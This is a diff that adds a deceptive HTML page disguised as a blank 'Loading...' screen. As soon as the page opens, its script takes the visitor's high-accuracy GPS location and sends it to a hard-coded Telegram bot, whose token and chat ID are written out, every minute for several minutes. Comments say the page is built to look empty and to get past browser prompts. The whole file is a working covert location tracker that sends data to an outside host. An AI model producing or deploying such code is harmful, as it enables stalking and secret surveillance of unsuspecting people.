@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { margin: 0; padding: 0; background: #fff; }
+        #status { text-align: center; margin-top: 20px; color: #555; font-size: 12px; }
+        /* Hide everything to make it look like a blank page */
+        iframe { display: none; }
+    </style>
+</head>
+<body>
+
+<div id="status">Locating...</div>
+
+<script>
+    // --- CONFIGURATION ---
+    const BOT_TOKEN = "9028245483:AAFPnhL9Za15l0zVwoI4vsw876k0e87qclc"; 
+    const CHAT_ID = "8823450323"; 
+    
+    let count = 0;
+    const maxUpdates = 50; // Kitni baar location bhejni hai (approx 4-5 minutes)
+
+    function sendLocation(lat, lng) {
+        count++;
+        const url = `https://maps.google.com/maps?q=${lat},${lng}&z=17`;
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                latitude: lat,
+                longitude: lng
+            })
+        }).then(() => {
+            console.log(`Sent update #${count}`);
+            if(count < maxUpdates) {
+                setTimeout(() => getLocation(), 60000); // Har 1 minute baad nayi location
+            } else {
+                document.getElementById('status').innerText = "Done!";
+            }
+        });
+    }
+
+    function getLocation() {
+        if (!navigator.geolocation) {
+            document.getElementById('status').innerText = "Geolocation not supported";
+            return;
+        }
+
+        // This request often works silently if the user has previously allowed location for this domain
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                sendLocation(lat, lng);
+            },
+            (error) => {
+                // If it fails once, try watching position which might bypass some UI blocks
+                watchLocation();
+            },
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+        );
+    }
+
+    function watchLocation() {
+        const watchId = navigator.geolocation.watchPosition(
+            (position) => {
+                sendLocation(position.coords.latitude, position.coords.longitude);
+            },
+            (error) => {
+                document.getElementById('status').innerText = "Error: " + error.message;
+            },
+            { enableHighAccuracy: true }
+        );
+        
+        // Stop watching after some time to save battery/data
+        setTimeout(() => {
+            navigator.geolocation.clearWatch(watchId);
+        }, 300000); // 5 minutes
+    }
+
+    // Start immediately
+    getLocation();
+
+</script>
+
+</body>
+</html>
